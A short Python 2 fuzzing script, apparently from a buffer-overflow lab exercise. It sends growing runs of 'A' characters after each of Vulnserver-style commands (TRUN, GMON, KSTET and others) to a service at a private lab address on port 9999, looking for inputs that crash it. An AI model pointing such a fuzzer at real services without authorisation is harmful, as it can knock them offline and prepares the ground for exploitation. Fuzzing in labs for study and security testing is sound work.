import socket
dest = '172.16.196.135'
dport = 9999


# Create and array of buffers, 1 to 4000 incrementing by 50
buffer=["A"]
counter=50

while len(buffer) <= 80:
     buffer.append("A"*counter)
     counter=counter+50


commands=["HELP","STATS ","RTIME ","LTIME ","SRUN ","TRUN ","GMON ","GDOG ","KSTET ","GTER ","HTER ","LTER ","KSTAN "]

for command in commands:
     for chars in buffer:
          print "Fuzzing " +command +" "+str(len(chars))
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((dest, dport))
          s.recv(100)
          s.send(command + chars)
          s.close()
